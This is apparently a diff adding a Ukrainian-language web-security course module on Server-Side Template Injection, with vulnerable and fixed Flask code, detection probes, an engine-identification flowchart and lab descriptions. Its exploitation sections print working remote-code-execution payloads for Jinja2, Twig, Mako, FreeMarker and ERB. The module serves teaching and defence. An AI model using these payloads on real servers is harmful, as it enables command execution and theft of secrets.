@@ -1,0 +1,305 @@
+<section class="module-header">
+  <h1>Модуль 13 — Server-Side Template Injection (SSTI)</h1>
+  <p>Дізнайся, як необроблений користувацький ввід у шаблонізаторах може призвести до віддаленого виконання коду.</p>
+</section>
+
+<section class="theory-section">
+
+  <h2>Коли шаблони стають виконанням коду</h2>
+  <p>
+    Шаблонізатори зустрічаються скрізь у веб-розробці. Кожного разу, коли ти бачиш сторінку з написом "Привіт, Алісо!" з твоїм справжнім ім'ям, цю сторінку, найімовірніше, згенерував шаблонізатор. Jinja2 у Python/Flask, Twig у PHP, ERB у Ruby on Rails, Handlebars у Node.js — усі вони роблять одне й те саме: беруть шаблон із змінними-заповнювачами та підставляють значення.
+  </p>
+  <p>
+    Проблема починається, коли розробник допускає тонку, але катастрофічну помилку: замість того, щоб передати користувацький ввід <em>як змінну</em> в шаблонізатор, він конкатенує його <em>безпосередньо в шаблон</em>. Це означає, що ввід користувача трактується не як дані — а як <strong>код шаблону</strong>. А код шаблону вміє набагато більше, ніж просто відображати текст.
+  </p>
+  <p>
+    SSTI — це ніби менш відомий родич SQL-ін'єкції. Патерн ідентичний: користувацький ввід потрапляє туди, де інтерпретується як код, а не як дані. Але якщо SQLi атакує базу даних, то SSTI атакує шаблонізатор — а через нього часто й увесь сервер.
+  </p>
+
+  <h2>Шаблонізатори на одному екрані</h2>
+  <p>Різні фреймворки використовують різні шаблонізатори, і кожен має свій синтаксис:</p>
+
+  <div class="table-wrapper">
+    <table>
+      <thead><tr><th>Движок</th><th>Мова</th><th>Синтаксис виразів</th><th>Синтаксис коментарів</th></tr></thead>
+      <tbody>
+        <tr><td>Jinja2</td><td>Python</td><td><code>{{ expr }}</code></td><td><code>{# comment #}</code></td></tr>
+        <tr><td>Twig</td><td>PHP</td><td><code>{{ expr }}</code></td><td><code>{# comment #}</code></td></tr>
+        <tr><td>Mako</td><td>Python</td><td><code>${ expr }</code></td><td><code>## comment</code></td></tr>
+        <tr><td>ERB</td><td>Ruby</td><td><code>&lt;%= expr %&gt;</code></td><td><code>&lt;%# comment %&gt;</code></td></tr>
+        <tr><td>Pug/Jade</td><td>JS</td><td><code>#{ expr }</code></td><td><code>//- comment</code></td></tr>
+        <tr><td>Handlebars</td><td>JS</td><td><code>{{ expr }}</code></td><td><code>{{!-- comment --}}</code></td></tr>
+        <tr><td>FreeMarker</td><td>Java</td><td><code>${ expr }</code></td><td><code>&lt;#-- comment --&gt;</code></td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <h2>Вразливий патерн</h2>
+  <p>
+    Ключове питання: <strong>користувацький ввід є частиною шаблону чи змінною, яка передається в шаблон?</strong>
+  </p>
+
+  <h3 class="text-red">Вразливий код — ввід стає шаблоном</h3>
+  <pre><code class="language-python">from flask import Flask, request, render_template_string
+
+@app.route('/greet')
+def greet():
+    name = request.args.get('name', 'World')
+    # DANGEROUS: user input is concatenated INTO the template
+    template = f"Hello {name}! Welcome to our site."
+    return render_template_string(template)
+
+# If name = "{{7*7}}", the template becomes:
+# "Hello {{7*7}}! Welcome to our site."
+# Jinja2 evaluates {{7*7}} → the page shows "Hello 49!"</code></pre>
+
+  <h3 class="text-green">Безпечний код — ввід є змінною</h3>
+  <pre><code class="language-python">@app.route('/greet')
+def greet():
+    name = request.args.get('name', 'World')
+    # SAFE: user input passed as a variable — never evaluated as template code
+    return render_template_string("Hello {{ name }}!", name=name)
+
+# If name = "{{7*7}}", the page shows "Hello {{7*7}}!"
+# The curly braces are treated as literal text, not template syntax</code></pre>
+
+  <p>
+    Різниця — один рядок коду. У вразливій версії f-string вставляє користувацький ввід у рядок шаблону <em>до того</em>, як Jinja2 його побачить, тому Jinja2 вважає його кодом шаблону. У безпечній версії Jinja2 точно знає, які частини є кодом шаблону, а які — даними.
+  </p>
+
+  <h2>Виявлення SSTI</h2>
+  <p>
+    Перший крок в експлуатації SSTI — це його виявлення. Ти вводиш математичні вирази в різних синтаксисах шаблонізаторів і перевіряєш, чи сервер їх обчислює. Якщо ти надсилаєш <code>{{7*7}}</code> і на сторінці відображається <code>49</code>, SSTI підтверджено.
+  </p>
+
+  <div class="table-wrapper">
+    <table>
+      <thead><tr><th>Зонд</th><th>Очікуваний результат при вразливості</th><th>Движок(и)</th></tr></thead>
+      <tbody>
+        <tr><td><code>{{7*7}}</code></td><td><code>49</code></td><td>Jinja2, Twig, Handlebars</td></tr>
+        <tr><td><code>{{7*'7'}}</code></td><td><code>7777777</code></td><td>Jinja2 конкретно (множення рядків у Python)</td></tr>
+        <tr><td><code>${7*7}</code></td><td><code>49</code></td><td>Mako, FreeMarker, Thymeleaf</td></tr>
+        <tr><td><code>&lt;%= 7*7 %&gt;</code></td><td><code>49</code></td><td>ERB (Ruby)</td></tr>
+        <tr><td><code>#{7*7}</code></td><td><code>49</code></td><td>Pug/Jade</td></tr>
+        <tr><td><code>${{7*7}}</code></td><td><code>49</code></td><td>Thymeleaf (Spring)</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="callout callout-info">
+    <strong>Універсальний зонд:</strong> Корисний універсальний тест — <code>${{7*7}}</code>. Знак долара та подвійні фігурні дужки покривають синтаксис одразу кількох движків. Якщо у відповіді з'являється <code>49</code>, ти знаєш, що SSTI існує. Конкретний синтаксис, який спрацював, підкаже тобі, який саме движок використовується.
+  </div>
+
+  <h2>Експлуатація Jinja2 — від арифметики до RCE</h2>
+  <p>
+    Гаразд, ти можеш змусити сервер обчислити <code>7*7</code>. Це мило. Але як перейти від обчислення арифметики до виконання команд операційної системи? У Jinja2 (Python) ти експлуатуєш об'єктну модель Python, проходячи по ієрархії класів і знаходячи небезпечні класи.
+  </p>
+  <p>
+    Ось хід думок крок за кроком:
+  </p>
+
+  <pre><code class="language-python"># Step 1: Start with any Python object — an empty string works
+{{ ''.__class__ }}
+# Output: &lt;class 'str'&gt;
+# We now have a reference to the str class
+
+# Step 2: Go up the class hierarchy to the root "object" class
+{{ ''.__class__.__mro__ }}
+# Output: (&lt;class 'str'&gt;, &lt;class 'object'&gt;)
+# __mro__ = Method Resolution Order — the inheritance chain
+
+# Step 3: From "object", list ALL classes in the Python runtime
+{{ ''.__class__.__mro__[1].__subclasses__() }}
+# Output: [&lt;class 'type'&gt;, &lt;class 'weakref'&gt;, ... HUNDREDS of classes]
+# Every class that inherits from "object" is listed here
+
+# Step 4: Find a class that can execute commands
+# Look for subprocess.Popen, os._wrap_close, etc.
+# The index varies by Python version — you need to find it
+
+# Step 5: Execute a command
+{{ ''.__class__.__mro__[1].__subclasses__()[INDEX]('id', shell=True, stdout=-1).communicate() }}
+# Output: (b'uid=1000(app) gid=1000(app)\n', None)</code></pre>
+
+  <p>
+    Виглядає складно, але логіка проста: починаєш з будь-якого об'єкта, піднімаєшся до кореня ієрархії класів, перераховуєш усі доступні класи, знаходиш той, що може виконувати команди, і використовуєш його. Є коротші payload'и, які роблять те саме:
+  </p>
+
+  <pre><code class="language-python"># Shorter RCE payloads for Jinja2:
+{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
+{{ request.application.__self__._get_data_for_json.__globals__['os'].popen('id').read() }}
+{{ cycler.__init__.__globals__.os.popen('id').read() }}</code></pre>
+
+  <div class="callout callout-warning">
+    <strong>Пісочниця Jinja2:</strong> У Jinja2 є <code>SandboxedEnvironment</code>, який обмежує доступ до небезпечних атрибутів. Проте обходи пісочниці знаходили неодноразово — наприклад, доступ до <code>__globals__</code> через неочевидні шляхи. Ніколи не покладайся на пісочницю як на єдиний захист. Справжнє рішення — ніколи не вставляти користувацький ввід у рядок шаблону.
+  </div>
+
+  <h2>SSTI за межами Jinja2</h2>
+  <p>Інші шаблонізатори мають свої шляхи експлуатації:</p>
+  <ul>
+    <li><strong>Twig (PHP):</strong> <code>{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}</code></li>
+    <li><strong>Mako (Python):</strong> Використовує синтаксис <code>${}</code> і має пряме виконання коду Python через <code>&lt;% import os; os.popen('id').read() %&gt;</code></li>
+    <li><strong>FreeMarker (Java):</strong> <code>${"freemarker.template.utility.Execute"?new()("id")}</code></li>
+    <li><strong>ERB (Ruby):</strong> <code>&lt;%= system('id') %&gt;</code> — майже тривіально експлуатується, оскільки ERB безпосередньо виконує код Ruby</li>
+  </ul>
+
+  <div class="callout callout-danger">
+    <strong>Наслідки:</strong> SSTI майже завжди призводить до <strong>Remote Code Execution (RCE)</strong>. Звідти атакуючий може читати чутливі файли (<code>/etc/passwd</code>, секрети застосунку), витягувати змінні оточення (API-ключі, облікові дані бази даних), проникати у внутрішні сервіси, встановлювати бекдори або повністю захопити сервер. SSTI — це вразливість критичного рівня серйозності.
+  </div>
+
+  <h2>Блок-схема визначення движка</h2>
+  <div class="network-diagram" style="text-align:center;">
+    <svg viewBox="0 0 700 420" style="max-width:100%;margin:0 auto;">
+      <style>
+        .ssti-box { fill: #161b22; stroke: #30363d; stroke-width: 1.5; rx: 6; }
+        .ssti-text { fill: #e6edf3; font-size: 12px; font-family: monospace; text-anchor: middle; }
+        .ssti-label { fill: #8b949e; font-size: 10px; font-family: sans-serif; text-anchor: middle; }
+        .ssti-yes { fill: #3fb950; font-size: 10px; font-family: sans-serif; font-weight: bold; }
+        .ssti-no { fill: #f85149; font-size: 10px; font-family: sans-serif; font-weight: bold; }
+        .ssti-result { fill: #d29922; font-size: 11px; font-family: monospace; text-anchor: middle; font-weight: bold; }
+        .ssti-arrow { stroke: #8b949e; stroke-width: 1.5; fill: none; marker-end: url(#arrowhead); }
+      </style>
+      <defs><marker id="arrowhead" markerWidth="8" markerHeight="6" refX="8" refY="3" orient="auto"><polygon points="0 0, 8 3, 0 6" fill="#8b949e"/></marker></defs>
+
+      <rect class="ssti-box" x="250" y="10" width="200" height="40"/>
+      <text class="ssti-text" x="350" y="35">Input: {{7*7}}</text>
+
+      <line class="ssti-arrow" x1="350" y1="50" x2="350" y2="80"/>
+      <rect class="ssti-box" x="270" y="80" width="160" height="35"/>
+      <text class="ssti-label" x="350" y="102">Output = 49?</text>
+
+      <line class="ssti-arrow" x1="270" y1="97" x2="140" y2="97"/>
+      <text class="ssti-no" x="200" y="92">No</text>
+      <line class="ssti-arrow" x1="350" y1="115" x2="350" y2="150"/>
+      <text class="ssti-yes" x="365" y="138">Yes</text>
+
+      <!-- No branch: try ${7*7} -->
+      <rect class="ssti-box" x="30" y="80" width="110" height="35"/>
+      <text class="ssti-label" x="85" y="102">Try ${7*7}</text>
+      <line class="ssti-arrow" x1="85" y1="115" x2="85" y2="150"/>
+      <rect class="ssti-box" x="20" y="150" width="130" height="35"/>
+      <text class="ssti-label" x="85" y="172">Output = 49?</text>
+      <line class="ssti-arrow" x1="85" y1="185" x2="85" y2="220"/>
+      <text class="ssti-yes" x="100" y="208">Yes</text>
+      <rect class="ssti-box" x="20" y="220" width="130" height="30"/>
+      <text class="ssti-result" x="85" y="240">Mako / FreeMarker</text>
+
+      <!-- Yes branch: try {{7*'7'}} -->
+      <rect class="ssti-box" x="260" y="150" width="180" height="40"/>
+      <text class="ssti-text" x="350" y="175">Input: {{7*'7'}}</text>
+
+      <line class="ssti-arrow" x1="350" y1="190" x2="350" y2="225"/>
+      <rect class="ssti-box" x="260" y="225" width="180" height="35"/>
+      <text class="ssti-label" x="350" y="247">Output = 7777777?</text>
+
+      <line class="ssti-arrow" x1="350" y1="260" x2="350" y2="300"/>
+      <text class="ssti-yes" x="365" y="285">Yes</text>
+      <rect class="ssti-box" x="290" y="300" width="120" height="30"/>
+      <text class="ssti-result" x="350" y="320">Jinja2</text>
+
+      <line class="ssti-arrow" x1="440" y1="242" x2="530" y2="242"/>
+      <text class="ssti-no" x="480" y="237">No</text>
+      <rect class="ssti-box" x="530" y="225" width="120" height="35"/>
+      <text class="ssti-result" x="590" y="247">Twig</text>
+
+      <!-- ERB branch from No -->
+      <line class="ssti-arrow" x1="20" y1="167" x2="-5" y2="167"/>
+      <text class="ssti-no" x="15" y="162">No</text>
+      <rect class="ssti-box" x="20" y="290" width="130" height="35"/>
+      <text class="ssti-label" x="85" y="312">Try &lt;%= 7*7 %&gt;</text>
+      <line class="ssti-arrow" x1="20" y1="167" x2="20" y2="290"/>
+      <line class="ssti-arrow" x1="85" y1="325" x2="85" y2="360"/>
+      <text class="ssti-yes" x="100" y="348">Yes</text>
+      <rect class="ssti-box" x="30" y="360" width="110" height="30"/>
+      <text class="ssti-result" x="85" y="380">ERB (Ruby)</text>
+    </svg>
+  </div>
+</section>
+
+<!-- ========== LABS ========== -->
+
+<h2>Labs</h2>
+
+<!-- Lab 1: Jinja2 Sandbox -->
+<div class="lab-container" id="lab1">
+  <div class="lab-header">
+    <div class="lab-title"><span class="lab-num">Lab 1</span> Jinja2 Template Sandbox</div>
+    <span class="lab-status" id="lab1-status"></span>
+  </div>
+
+  <div class="lab-objective">
+    <strong>Objective:</strong> A web app renders your input through a Jinja2 template. A secret variable exists in the template context. Find and extract it using template injection.
+  </div>
+
+  <div id="pyodide-loading" class="loading-indicator">
+    <div class="spinner"></div>
+    Loading Python runtime (~10 MB)... This may take a moment.
+  </div>
+
+  <div id="lab1-content" style="display:none;">
+    <div class="callout callout-info mb-md">
+      <strong>Template source:</strong>
+      <pre style="margin:8px 0 0;"><code class="language-python">template = "Hello {{ name }}! Welcome to our site."
+result = template.render(name=user_input, secret_flag=SECRET)</code></pre>
+    </div>
+
+    <div class="input-group">
+      <label>Enter your name (injection point):</label>
+      <input type="text" class="input-field" id="ssti-input" placeholder="e.g., World  or  {{7*7}}  or  {{secret_flag}}">
+    </div>
+
+    <button class="btn btn-primary" id="ssti-render-btn">Render Template</button>
+
+    <div class="mt-md">
+      <label style="font-size:0.8rem;color:var(--text-secondary);font-weight:600;">Output:</label>
+      <div class="terminal-output" id="ssti-output">Output will appear here...</div>
+    </div>
+
+    <div class="banner banner-success" id="lab1-banner">
+      &#9989; Secret extracted! You found the hidden flag via template injection.
+    </div>
+  </div>
+</div>
+
+<!-- Lab 2: Engine Detection Quiz -->
+<div class="lab-container" id="lab2">
+  <div class="lab-header">
+    <div class="lab-title"><span class="lab-num">Lab 2</span> Engine Detection Quiz</div>
+    <span class="lab-status" id="lab2-status"></span>
+  </div>
+
+  <div class="lab-objective">
+    <strong>Objective:</strong> Given a probe input and the server's response, identify which template engine produced the output. Score at least 4/5 to complete.
+  </div>
+
+  <div id="quiz-container"></div>
+
+  <div id="quiz-result" style="display:none;" class="panel mt-md">
+    <h3 id="quiz-score"></h3>
+    <p id="quiz-feedback"></p>
+  </div>
+
+  <div class="banner banner-success" id="lab2-banner">
+    &#9989; Excellent! You can identify template engines from their output.
+  </div>
+</div>
+
+<!-- ============================================
+     FLASK LAB SECTION
+     ============================================ -->
+<div class="lab-card" style="border-color: var(--accent-blue); background: linear-gradient(135deg, #0d1117 0%, #111827 100%);">
+  <div class="lab-header">
+    <div class="lab-title"><span class="lab-num flask">Flask Lab</span> NeonGreet — Real SSTI Practice</div>
+  </div>
+  <div class="lab-body">
+    <p>Inject Jinja2 templates into a <strong>real Flask application</strong>. Leak secrets, bypass filters, and achieve RCE.</p>
+    <div class="panel" style="margin-top: 12px;">
+      <strong>Setup:</strong>
+      <pre><code class="language-bash">cd labs/ssti
+pip install flask
+python app.py
+# Visit http://localhost:5003</code></pre>
+    </div>
+    <p class="text-muted" style="margin-top: 8px;">Challenges: Basic SSTI, Filter Bypass, Blind SSTI, Object Traversal, Debug Leak</p>
+  </div>
+</div>
